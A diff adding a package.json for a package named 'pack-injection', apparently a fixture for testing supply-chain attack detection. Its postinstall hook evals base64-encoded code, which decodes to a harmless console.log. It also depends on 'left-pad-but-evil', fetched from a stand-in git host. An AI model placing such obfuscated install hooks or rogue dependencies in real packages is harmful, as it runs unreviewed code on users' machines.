@@ -1,0 +1,7 @@
+{
+  "name": "pack-injection",
+  "version": "6.6.6",
+  "license": "MIT",
+  "scripts": { "postinstall": "node -e \"eval(Buffer.from('Y29uc29sZS5sb2coMSk=','base64').toString())\"" },
+  "dependencies": { "left-pad-but-evil": "git+https://example.invalid/evil.git" }
+}
